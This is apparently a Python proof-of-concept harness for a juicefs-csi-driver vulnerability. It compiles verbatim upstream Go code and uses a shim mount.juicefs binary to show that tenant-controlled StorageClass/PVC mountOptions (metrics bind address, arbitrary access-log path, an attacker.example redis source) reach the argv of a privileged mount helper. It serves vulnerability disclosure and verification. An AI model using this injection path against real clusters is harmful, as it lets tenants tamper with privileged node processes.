"""juicefs-csi-driver v0.33.1 mountOptions -> privileged exec argv (function level, Go).

Upstream ``pkg/juicefs/mount/process_mount.go:202`` (verbatim pinned tag) builds

    mntCmd := exec.Command(jfsConfig.CeMountPath, mountArgs...)

where ``mountArgs`` carries the tenant-influenced JuiceFS ``mountOptions`` from the
StorageClass/PVC (``-o`` joined string, plus the ``source`` from the volume secret) and
runs it inside the privileged CSI node pod.  Whoever can create/patch a PVC or
StorageClass controls entries of that argv (e.g. ``metrics=0.0.0.0:9567``,
``access-log=<path>``).

The Linux-only parts of ``pkg/util`` cannot compile on this Windows host, so the PoC
extracts the exact upstream code paths verbatim at runtime (method ``jmount``, the
``ProcessMount`` struct, the ``GenLog``/``ContainsString``/``StripPasswd``/
``DoWithTimeout`` helpers and the ``FsType``/``CeMountPath`` consts) into a small Go
probe; ``k8s.io/mount-utils``/``klog`` are the real library builds.  The upstream
``CeMountPath`` const ``/bin/mount.juicefs`` resolves on Windows to
``<drive>:\\bin\\mount.juicefs`` relative to the probe's working drive; a shim binary at
that exact path records the argv the privileged mount helper would have received (same
PATH-shim technique as the verified DeepSpeed CVE-2024-43497 ``dpkg.exe`` case).
"""

from __future__ import annotations

import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
import poclib  # noqa: E402

GOPROXY = os.environ.get("GOPROXY") or "https://goproxy.cn,direct"

SHIM_GO = '''package main

import (
	"fmt"
	"os"
)

func main() {
	f, err := os.Create(os.Getenv("JFS_SHIM_OUT"))
	if err != nil {
		os.Exit(1)
	}
	defer f.Close()
	for i, a := range os.Args {
		fmt.Fprintf(f, "%d=%s\\n", i, a)
	}
	os.Exit(0)
}
'''


def _go() -> str:
    home = Path.home()
    for cand in (
        home / "AppData" / "Local" / "go-toolchain" / "go" / "bin" / "go.exe",
        Path(os.environ.get("LOCALAPPDATA", "x")) / "go-toolchain" / "go" / "bin" / "go.exe",
    ):
        if cand.is_file():
            return str(cand)
    which = shutil.which("go")
    if which:
        return which
    poclib.fail("Go toolchain not found (LOCALAPPDATA go-toolchain or PATH)")


def _extract(text: str, header: str) -> tuple[str, int, int]:
    """Extract a verbatim block starting at the line containing `header` until braces balance."""
    lines = text.splitlines()
    start = None
    for i, line in enumerate(lines):
        if header in line:
            start = i
            break
    if start is None:
        poclib.fail(f"cannot locate {header!r} in pinned source")
    depth = 0
    for j in range(start, len(lines)):
        depth += lines[j].count("{") - lines[j].count("}")
        if depth == 0 and j > start:
            return "\n".join(lines[start:j + 1]), start + 1, j + 1
    poclib.fail(f"unbalanced braces extracting {header!r}")


def main() -> None:
    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    src = poclib.upstream_path(manifest["root_cause"]["source"])
    if not src.is_file():
        poclib.fail(f"missing pinned upstream source: {src}")
    vendored_root = src.parents[3]  # .../juicefs-csi-driver/v0.33.1
    pm_text = src.read_text(encoding="utf-8")
    util_text = (vendored_root / "pkg" / "util" / "util.go").read_text(encoding="utf-8")
    log_text = (vendored_root / "pkg" / "util" / "log.go").read_text(encoding="utf-8")

    jmount_src, jmount_a, jmount_b = _extract(pm_text, "func (p *ProcessMount) jmount(")
    struct_src, struct_a, struct_b = _extract(pm_text, "type ProcessMount struct")
    genlog_src, genlog_a, genlog_b = _extract(log_text, "func GenLog(")
    contains_src, contains_a, contains_b = _extract(util_text, "func ContainsString(")
    strip_src, strip_a, strip_b = _extract(util_text, "func StripPasswd(")
    dowith_src, dowith_a, dowith_b = _extract(util_text, "func DoWithTimeout(")
    work = poclib.EVIDENCE_DIR / "work"
    if work.exists():
        shutil.rmtree(work)
    probe = work / "probe"
    (probe / "jfsutil").mkdir(parents=True)
    (probe / "shim").mkdir(parents=True)
    (probe / "shim" / "main.go").write_text(SHIM_GO, encoding="utf-8")

    # --- verbatim helper package (pure-Go subset of the Linux-only pkg/util) ---
    jfsutil = (
        "package jfsutil\n\n"
        "import (\n\t\"context\"\n\t\"errors\"\n\t\"strings\"\n\t\"time\"\n\n\tklog \"k8s.io/klog/v2\"\n)\n\n"
        f"// verbatim: pkg/util/log.go:26-28 (LogKey/LoggerType consts)\n"
        "const LogKey = \"jfs-logger\"\n\ntype LoggerType string\n\n"
        f"// verbatim: pkg/util/log.go:{genlog_a}-{genlog_b}\n"
        f"{genlog_src}\n\n"
        f"// verbatim: pkg/util/util.go:{contains_a}-{contains_b}\n"
        f"{contains_src}\n\n"
        f"// verbatim: pkg/util/util.go:{strip_a}-{strip_b}\n"
        f"{strip_src}\n\n"
        f"// verbatim: pkg/util/util.go:{dowith_a}-{dowith_b}\n"
        f"{dowith_src}\n"
    )
    (probe / "jfsutil" / "jfsutil.go").write_text(jfsutil, encoding="utf-8")

    # --- verbatim upstream code under test (sink at line 202) ---
    upstream_block = (
        f"// consts verbatim: pkg/config/config.go:83,86\n"
        "const (\n\tFsType = \"juicefs\"\n\tCeMountPath = \"/bin/mount.juicefs\"\n)\n\n"
        "// const verbatim: pkg/juicefs/mount/process_mount.go:37\n"
        "const defaultCheckTimeout = 5 * time.Second\n\n"
        f"// verbatim: pkg/juicefs/mount/process_mount.go:{struct_a}-{struct_b}\n"
        f"{struct_src}\n\n"
        f"// verbatim: pkg/juicefs/mount/process_mount.go:{jmount_a}-{jmount_b}\n"
        f"{jmount_src}\n"
    )
    upstream_block = (
        upstream_block
        .replace("jfsConfig.CeMountPath", "CeMountPath")
        .replace("jfsConfig.FsType", "FsType")
        .replace("util.GenLog", "jfsutil.GenLog")
        .replace("util.DoWithTimeout", "jfsutil.DoWithTimeout")
        .replace("util.StripPasswd", "jfsutil.StripPasswd")
        .replace("util.ContainsString", "jfsutil.ContainsString")
        # syscall.Stat_t is Linux-only; rebound to a byte-identical stand-in type so the
        # verbatim body compiles on Windows (the assertion simply fails -> wait loop)
        .replace("syscall.", "jfssyscall.")
    )
    # --- Linux syscall stand-in (documented divergence: type shape only) ---
    jfs_syscall = (
        "package jfssyscall\n\n"
        "import \"os\"\n\n"
        "// Stat_t mirrors the Linux field the upstream wait loop asserts on (Ino).\n"
        "type Stat_t struct{ Ino uint64 }\n\n"
        "func Environ() []string { return os.Environ() }\n"
    )
    sysc_dir = probe / "jfssyscall"
    sysc_dir.mkdir(parents=True, exist_ok=True)
    (sysc_dir / "jfssyscall.go").write_text(jfs_syscall, encoding="utf-8")
    driver_go = "package main\n\n" + (
        "import (\n"
        "\t\"context\"\n\t\"fmt\"\n\t\"os\"\n\t\"os/exec\"\n\t\"strings\"\n\t\"time\"\n\n"
        "\tklog \"k8s.io/klog/v2\"\n\tk8sMount \"k8s.io/mount-utils\"\n\n"
        "\t\"uvjuicefs/jfssyscall\"\n\t\"uvjuicefs/jfsutil\"\n)\n\n"
        "var _ = context.Background\nvar _ = fmt.Sprintf\nvar _ = os.MkdirAll\nvar _ = exec.Command\n"
        "var _ = strings.Contains\nvar _ = time.Sleep\nvar _ = klog.NewKlogr\n"
        "var _ = k8sMount.New\nvar _ = jfsutil.GenLog\nvar _ = jfssyscall.Environ\n\n"
    ) + upstream_block
    (probe / "driver.go").write_text(driver_go, encoding="utf-8")

    # --- attacker inputs + entrypoint ---
    main_go = (
        "package main\n\n"
        "import (\n\t\"context\"\n\t\"fmt\"\n\t\"os\"\n\t\"path/filepath\"\n\t\"time\"\n\n"
        "\tklog \"k8s.io/klog/v2\"\n\tk8sMount \"k8s.io/mount-utils\"\n\t\"k8s.io/utils/exec\"\n)\n\n"
        "func main() {\n"
        "\tctx, cancel := context.WithTimeout(context.Background(), 90*time.Second)\n"
        "\tdefer cancel()\n"
        "\tmountDir := os.Getenv(\"JFS_MOUNT_DIR\")\n"
        "\t_ = os.MkdirAll(mountDir, 0o755)\n"
        "\tsource := \"redis://attacker.example/0\"\n"
        "\toptions := []string{\n"
        "\t\t\"metrics=0.0.0.0:9567\",\n"
        "\t\t\"access-log=\" + filepath.Join(filepath.Dir(mountDir), \"attacker-access.log\"),\n"
        "\t\t\"cache-size=1\",\n"
        "\t}\n"
        "\tpmount := &ProcessMount{klog.NewKlogr().WithName(\"process-mount\"),\n"
        "\t\tk8sMount.SafeFormatAndMount{Interface: k8sMount.New(\"\"), Exec: exec.New()}}\n"
        "\terr := pmount.jmount(ctx, source, mountDir, \"redis\", options, map[string]string{\"metaurl\": source})\n"
        "\tfmt.Println(\"JMount returned:\", err)\n"
        "}\n"
    )
    (probe / "main.go").write_text(main_go, encoding="utf-8")

    (probe / "go.mod").write_text(
        "module uvjuicefs\n\ngo 1.25\n\nrequire (\n"
        "\tk8s.io/klog/v2 v2.140.0\n"
        "\tk8s.io/mount-utils v0.31.3\n"
        "\tk8s.io/utils v0.0.0-20241104100929-3ea5e8cea738\n"
        ")\n",
        encoding="utf-8",
    )

    go = _go()
    env = dict(os.environ)
    env.update({
        "GOPATH": str(Path.home() / "AppData" / "Local" / "go-toolchain" / "gopath"),
        "GOFLAGS": "-mod=mod",
        "GOPROXY": GOPROXY,
        "CGO_ENABLED": "0",
    })

    drive = Path(work).anchor[:2]  # e.g. "D:"
    shim_target = Path(drive + "\\bin\\mount.juicefs")
    shim_out = poclib.EVIDENCE_DIR / "shim-argv.txt"
    mount_dir = poclib.EVIDENCE_DIR / "mnt"
    shim_target.parent.mkdir(parents=True, exist_ok=True)

    # public-tree hygiene: keep host paths out of the committed evidence
    repo_root = str(poclib.REPO_ROOT)
    workspace_root = str(poclib.REPO_ROOT.parents[1])

    def _clean(value: str) -> str:
        shim_abs = str(shim_target)
        for old, new in ((workspace_root, "<workspace>"), (repo_root, "<repo>"),
                         (workspace_root.replace("\\", "/"), "<workspace>"),
                         (repo_root.replace("\\", "/"), "<repo>"),
                         (workspace_root.replace("\\", "\\\\"), "<workspace>"),
                         (repo_root.replace("\\", "\\\\"), "<repo>"),
                         (shim_abs.replace("\\", "\\\\"), "<drive>:/bin/mount.juicefs"),
                         (shim_abs, "<drive>:/bin/mount.juicefs")):
            value = value.replace(old, new)
        return value

    proc = None
    try:
        subprocess.run([go, "build", "-o", str(probe / "shim" / "mount.juicefs"),
                        str(probe / "shim" / "main.go")],
                       cwd=probe, env=env, capture_output=True, text=True, timeout=300, check=True)
        tidy = subprocess.run([go, "mod", "tidy"], cwd=probe, env=env, capture_output=True, text=True, timeout=900)
        build = subprocess.run([go, "build", "-o", "probe.exe", "."], cwd=probe, env=env,
                               capture_output=True, text=True, timeout=900)
        if build.returncode != 0:
            poclib.fail("probe build failed", go_stderr=build.stderr[-4000:], tidy_stderr=tidy.stderr[-2000:])
        shutil.copy2(probe / "shim" / "mount.juicefs", shim_target)

        poclib.start_marker("ABSENT")
        mount_dir.mkdir(parents=True, exist_ok=True)
        shim_out.write_text("", encoding="utf-8")
        run_env = dict(env)
        run_env.update({"JFS_SHIM_OUT": str(shim_out), "JFS_MOUNT_DIR": str(mount_dir)})
        proc = subprocess.run([str(probe / "probe.exe")], cwd=work, env=run_env,
                              capture_output=True, text=True, timeout=180)
        argv_text = _clean(shim_out.read_text(encoding="utf-8"))
        (poclib.EVIDENCE_DIR / "probe-stdout.txt").write_text(_clean(proc.stdout), encoding="utf-8")
        (poclib.EVIDENCE_DIR / "probe-stderr.txt").write_text(_clean(proc.stderr), encoding="utf-8")
    finally:
        if shim_target.exists():
            shim_target.unlink()
        try:
            if shim_target.parent.exists() and not any(shim_target.parent.iterdir()):
                shim_target.parent.rmdir()
        except OSError:
            pass

    argv = [line.split("=", 1)[1] for line in argv_text.splitlines() if "=" in line]
    argv = [_clean(a) for a in argv]
    injected = [a for a in argv[1:] if "attacker" in a or "0.0.0.0:9567" in a]
    if not argv or not injected:
        poclib.fail("shim did not observe the attacker-controlled mountOptions in the mount argv",
                    argv=argv, probe_rc=(proc.returncode if proc else None),
                    stdout_tail=(proc.stdout[-2000:] if proc else ""),
                    stderr_tail=(proc.stderr[-2000:] if proc else ""))

    poclib.prove_marker()
    poclib.finish_verified(
        {
            "transport": {
                "type": "function-level Go probe (verbatim upstream jmount) + argv shim",
                "entrypoint": "github.com/juicedata/juicefs-csi-driver/pkg/juicefs/mount.ProcessMount.jmount",
                "source": poclib.rel(src),
                "source_sha256": poclib.sha256_file(src),
                "sink_line": 202,
                "sink": "mntCmd := exec.Command(jfsConfig.CeMountPath, mountArgs...)",
                "verbatim_extractions": {
                    "jmount": f"pkg/juicefs/mount/process_mount.go:{jmount_a}-{jmount_b} sha256={hashlib.sha256(jmount_src.encode()).hexdigest()}",
                    "ProcessMount_struct": f"pkg/juicefs/mount/process_mount.go:{struct_a}-{struct_b} sha256={hashlib.sha256(struct_src.encode()).hexdigest()}",
                    "GenLog": f"pkg/util/log.go:{genlog_a}-{genlog_b}",
                    "ContainsString": f"pkg/util/util.go:{contains_a}-{contains_b}",
                    "StripPasswd": f"pkg/util/util.go:{strip_a}-{strip_b}",
                    "DoWithTimeout": f"pkg/util/util.go:{dowith_a}-{dowith_b}",
                    "consts": "pkg/config/config.go:83,86 (FsType/CeMountPath)",
                },
                "argv_received_by_mount_helper": argv,
                "attacker_controlled_argv": [_clean(a) for a in injected],
                "shim_path": "<drive>:/bin/mount.juicefs (upstream const /bin/mount.juicefs resolved against the working drive)",
                "mount_options_channel": "StorageClass.spec.mountOptions / PVC volumeContext -> JfsSetting.Options -> -o joined argv",
                "impact": "PVC/StorageClass write access turns into privileged argv control of /bin/mount.juicefs inside the CSI node pod (metrics bind, access-log arbitrary path, etc.)",
                "probe_exit_code": proc.returncode,
                "go_version": subprocess.run([go, "version"], capture_output=True, text=True, env=env).stdout.strip(),
                "note": "Go probe pattern follows the verified sglang CVE-2026-3060 method-extraction precedent; exec.Command is reached with the real mount-utils library and the real upstream consts.",
            },
            "request_response": [
                {
                    "dir": "StorageClass mountOptions (attacker) -> CSI NodePublishVolume -> jmount -> exec.Command(/bin/mount.juicefs, ...)",
                    "payload": "metrics=0.0.0.0:9567, access-log=<arbitrary path>, cache-size=1",
                    "result": f"mount helper argv = {argv[:6]}",
                }
            ],
            "state_before": "marker=ABSENT",
            "state_after": "marker contains proof text; shim recorded attacker argv",
        }
    )


if __name__ == "__main__":
    main()
